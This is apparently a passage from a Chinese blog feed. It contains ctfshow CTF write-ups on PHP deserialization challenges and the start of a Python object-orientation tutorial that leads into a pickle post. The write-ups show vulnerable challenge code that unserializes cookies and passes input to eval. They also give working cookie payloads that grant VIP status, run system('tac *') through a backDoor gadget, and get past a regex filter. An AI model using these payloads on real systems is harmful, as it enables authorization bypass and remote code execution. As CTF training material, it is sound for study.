class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">传入username和password的值为xxxxxx，cookie值为类ctfShowUser的对象，利用反序列化把<span class="hljs-variable">$isvip</span>改<span class="hljs-built_in">为true</span><br>cookie的值必须url编码<br>payload：<br>?username=xxxxxx&amp;password=xxxxxx<br>cookie:O<span class="hljs-meta">%3A11</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22ctfShowUser</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A5</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22isVip</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bb</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span><br></code></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">这题先反序列化可以改username和passwod的值，最后username和password不相等就可以<br><span class="hljs-symbol">payload:</span><br>?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<span class="hljs-number">1</span><br><span class="hljs-symbol">cookie:</span>user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-number">1</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//payload:</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;system(&#x27;tac *&#x27;);&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//利用construct魔术方法给class赋为backDoor的对象，backDoor对象里的code为我们想执行的命令。</span><br><span class="hljs-comment">//url里还要传入?username=xxxxxx&amp;password=xxxxxx</span><br></code></pre></td></tr></table></figure><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">相比上题，类里面的属性变为public，传入的user会匹配”O:数字“，我们只需要在数字前加个+，url编码后为<span class="hljs-variable">%2</span>B<br><span class="hljs-symbol">payload:</span><br>??username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br><span class="hljs-symbol">cookie:</span>user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">16</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>tac+<span class="hljs-variable">%2</span>A<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/2024/08/07/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/08/07/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="Python面向对象"><a href="#Python面向对象" class="headerlink" title="Python面向对象"></a>Python面向对象</h3><p>参考：<a href="https://www.runoob.com/python/python-object.html">Python 面向对象 | 菜鸟教程 (runoob.com)</a></p><h4 id="面向对象简介："><a href="#面向对象简介：" class="headerlink" title="面向对象简介："></a>面向对象简介：</h4><ul><li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><strong>数据成员：</strong>类变量或者实例变量, 用于处理类及其实例对象的相关的数据。</li><li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li><li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li><li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的。这种变量就称为实例变量，是在类声明的内部但是在类的其他成员方法之外声明的。</li><li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。</li><li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li><li><strong>方法：</strong>类中定义的函数。</li><li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法</li></ul><h4 id="创建类："><a href="#创建类：" class="headerlink" title="创建类："></a>创建类：</h4><p>使用class语句来创建一个新类，class之后为类的名称并以冒号结尾：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassName</span>:<br>   <span class="hljs-string">&#x27;类的帮助信息&#x27;</span>   <span class="hljs-comment">#类文档字符串</span><br>   class_suite  <span class="hljs-comment">#类体</span><br></code></pre></td></tr></table></figure><p>类的帮助信息可以通过ClassName.__doc__查看。</p><p>class_suite 由类成员，方法，数据属性组成。</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>:<br>    <span class="hljs-string">&#x27;所有员工的基类&#x27;</span><br>    empCount = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, salary</span>):<br>        self.name = name<br>        self.salary = salary<br>        Employee.empCount += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayCount</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total Employee %d&quot;</span> % Employee.empCount)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayEmployee</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Name : &quot;</span>, self.name, <span class="hljs-string">&quot;, Salary: &quot;</span>, self.salary)<br></code></pre></td></tr></table></figure><ul><li>empCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。</li><li>第一种方法__init__()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法</li><li>self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。</li></ul><h4 id="self代表类的实例，而非类"><a href="#self代表类的实例，而非类" class="headerlink" title="self代表类的实例，而非类"></a>self代表类的实例，而非类</h4><p>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的<strong>第一个参数名称</strong>, 按照惯例它的名称是 self。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">prt</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self)<br>        <span class="hljs-built_in">print</span>(self.__class__)<br> <br>t = Test()<br>t.prt()<br></code></pre></td></tr></table></figure><p>以上实例执行结果为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;__main__.Test instance at 